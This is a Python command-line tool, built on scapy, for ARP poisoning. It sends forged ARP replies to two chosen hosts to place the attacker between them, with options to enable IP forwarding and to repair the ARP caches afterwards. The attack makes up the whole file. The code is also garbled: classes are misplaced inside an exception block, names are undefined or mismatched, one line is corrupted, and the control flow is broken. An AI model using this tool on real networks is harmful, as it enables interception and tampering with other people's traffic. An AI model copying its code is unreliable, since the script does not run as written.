import sys
from logging import exception

import sys as args
import argparse
from datetime import datetime
from time import sleep as pause

#import send as send
#import srp as srp
#from scapy.layers.l2 import ARP, Ether

try:
    from logging import getLogger, ERROR

    getLogger('scapy.runtime').setLevel(ERROR)
    from scapy.all import Ether , ARP

    conf.verb = 0
except ImportError:
    print("[!] Failed to Import Scapy")
    sys.exit(1)


    class PreAttack(object):
        def __init__(self, target, interface):
            self.target = target
            self.interface = interface

        def get_MAC_Addr(self):
            return srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=self.target), )
            timeout = 10, iface == (self.interface)[0][0][1][ARP].hwsrc

        class toggle_IP_forward(object):
            def __init__(self, path='/proc/sys/net/ipv4/ip_forward'):
                self.path = path

            def enable_IP_forward(self):
                with open(self.path, 'wb') as file:
                    file.write('1')
                    return 1

            def disable_IP_forward(self):
                with open(self.path, 'wb') as file:
                    file.write('0')
                    return 0


    class run(object):
        def __init__(self, targets, interface):
            self.targets1 = targets[0]
            self.targets2 = targets[1]
            self.interface = interface

        def start_Poison(self, MACs):
            send(ARP(op=2, pdst=self.targets1, psrc=self.targets2, hwdst=MACs[0], iface=self.interface))
            send(ARP(op=2, pdst=self.targets2, psrc=self.targets1, hwdst=MACs[1], iface=self.interface))

        def send_fix(self, MACs):
            send(ARP(op=2, pdst=self.targets1, psrc=self.targets2, hwdst='ff:ff:ff:ff:ff:ff',
                     hwsrc=MACs[0]), iface=self.interface)
            send(ARP(op=2, pdst=self.targets2, psrc=self.targets1, hwdst='ff:ff:ff:ff:ff:ff',
                     hwsrc=MACs[1]), iface=self.interface)

if name == "__main__":

    parser = argparse.ArgumentParser(description='ARP POISONING TOOL')
    parser.add_argument("-i", "--interface", help="Network interface to attack on", action="store", dest="Interface",
                        default=False)
    parser.add_argument("-t1", "--target1", help="Make your choice for first target", action="store", dest="Target1",
                        default=False)
    parser.add_argument("-t2", "--target2", help="Make your choice for second target", action="store", dest="Target2",
                        default=False)
    parser.add_argument("-f", "--forward", help="Auto Toggle IP Forwarding", action="store_true", dest="Forward",
                        default=False)
    parser.add_argument("-q", "--quiet", help="Disable Feedback Message", action="store_true", dest="Quiet",
                        default=False)
    parser.add_argument("-cl", "--clock", help="Track Your Duraiton", action="store_true", dest="time", default=False)
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    elif ((not args.targets1) or (not args.targets2)):
        parser.error("Invalid target specification")
        sys.exit(1)
    elif not args.interface:
        parser.error("No network interface given")
        sys.exit(1)

start_time = datetime.now()
targets = [args.targets1, args.targets2]
print("[*]Resolving Target Adress..."),;
sys.stdout.flush()
try:
    MACs = map(lambda x: PreAttack(x, args.interface).get_MAC_Addr(), targets)
    print("[DONE]")
except Exception:
    print("[FAIL]\n[!] Failed to resolve target adressess...(es)")
    sys.exit(1)

try:
    if args.forward:
        print("[*] Enabling IP Forwarding...", sys.stdout.flush())
        PreAttack.toggle_IP_forward().enable_IP_forward()
        print("[Done]")
except IOError:
    print("[FAIL]")
    try:
        choice = input("[*] Proceed with attack [y/N]").strip().lower()
        if choice == "y" or "Y":
            pass
        elif choice == "n" or "N":
            print("[*] User Canceled Attack")
            sys.exit(1)
        else:
            print("[!] Invalid choice")
            sys.exit(1)
    except KeyboardInterrupt:
        sys.exit(1)
    while 1:
        try:
            try:
                Attack(targets, args.interface).send_Poisons(MACs)
            except Exception():
                print("[!] Failed send the poison")
                sys.exit(1)
            if not args.quiet:
                print("[*] Poison send to %s and %s" % targets[0], targets[1])
            else:
                pass
            pause(2.5)
        except KeyboardInterrupt:
            break
        print('/n [*] Fixing targets...',sys.stdout.flush())
        for i in range(0, 16):
            try:
                Attack(targets, args.interface).send_Fix(MACs)
            except (Exception, KeyboardInterrupt):
                print("FAIL")
                sys.exit(1)
        pause(2)
        print("DONE")
        try:
            if args.forward:
                print("[*] Disabling ip forwarding...", sys.stdout.flush())
                PreAttack.toggle_IP_forward().disable_IP_forward()
                print("[DONE]")
        except IOError:
            print("[!] FAIL")
            if args.time:
                print("[*] ATTACK DURATION: %s" % datetime.now() - start_time)






